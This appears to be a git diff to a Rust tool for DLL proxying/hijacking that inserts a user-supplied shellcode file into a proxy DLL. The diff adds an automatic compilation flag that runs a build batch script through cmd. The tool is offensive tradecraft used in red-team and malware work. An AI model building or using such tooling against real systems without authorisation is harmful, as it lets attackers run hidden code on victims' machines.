@@ -17,7 +17,7 @@ use std::{
     fs::{copy, create_dir_all, File},
     io::{self, Write},
     path::Path,
-    process,
+    process::{exit, Command},
 };
 
 #[derive(Parser)]
@@ -34,12 +34,17 @@ struct Cli {
     /// Shellcode file to insert in the hijacked dll
     #[clap(short, long)]
     payload: String,
+
+    /// Automatic DLL compilation
+    #[clap(short, long)]
+    auto: bool,
 }
 
 fn main() {
     let cli = Cli::parse();
     let dll_loc = cli.dll;
     let payload_loc = cli.payload;
+    let auto = cli.auto;
     let tmp_name = format!(
         "{}{}",
         "tmp",
@@ -55,7 +60,7 @@ fn main() {
             "{}",
             "[!] Scripts file doesn't exist. Please copy it from https://github.com/aancw/DllProxy-rs".red()
         );
-        process::exit(1);
+        exit(1);
     }
 
     if check_path_exist(&dll_loc) {
@@ -64,7 +69,7 @@ fn main() {
                 "{}",
                 "[!] Shellcode File doesn't exist. Please enter the correct location".red()
             );
-            process::exit(1);
+            exit(1);
         }
 
         let file_noext = Path::new(&dll_loc).file_stem().unwrap().to_string_lossy();
@@ -136,15 +141,19 @@ fn main() {
             )
             .unwrap();
         let c_file = format!("{}/{}_pragma.cpp", &out_dir, &file_noext);
+        let dll_file = format!("{}/{}.dll", &out_dir, &file_noext);
         let out_file = File::create(&c_file).unwrap();
         println!("[+] Exporting DLL C source code to {}", &c_file);
         write!(&out_file, "{}", &templ).expect("Cannot write file");
-        println!("[+] Compiling C source to DLL {}", &file_name);
-        
+        println!("[+] Copying original DLL for proxying as {}.dll", &tmp_name);
         copy_file(&dll_loc, &format!("{}/{}.dll", &out_dir, &tmp_name));
+        if auto {
+            println!("[+] Compiling C source to DLL {}", &file_name);
+            compile_dll(_dllsystem, &c_file, &dll_file);
+        }
     } else {
         println!("DLL File doesn't exist. Please enter the correct location");
-        process::exit(1);
+        exit(1);
     }
 }
 
@@ -190,7 +199,7 @@ fn abort(message: &str) -> ! {
         let _ = stderr.write(b".\n");
         let _ = stderr.flush();
     }
-    process::exit(1);
+    exit(1);
 }
 
 fn check_path_exist(path: &str) -> bool {
@@ -201,6 +210,17 @@ fn create_io_dir(dirname: &String) {
     if let Err(e) = create_dir_all(dirname) {
         println!("{:?}", e)
     }
+}
+
+fn compile_dll(system: &str, source_loc: &str, out_file: &str) {
+    Command::new("cmd")
+        .arg("/C")
+        .arg(format!(
+            r##".\scripts\build-dll.bat {} {} {}"##,
+            system, source_loc, out_file
+        ))
+        .spawn()
+        .expect("failed to execute process");
 }
 
 fn copy_file(from: &String, to: &String) {
@@ -261,8 +281,3 @@ LPVOID lpReserved
     "###};
     template.to_string()
 }
-
-/*
-fn check_buildtool_exist(){
-    // cmd.exe /C '"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" && cl.exe'
-}*/
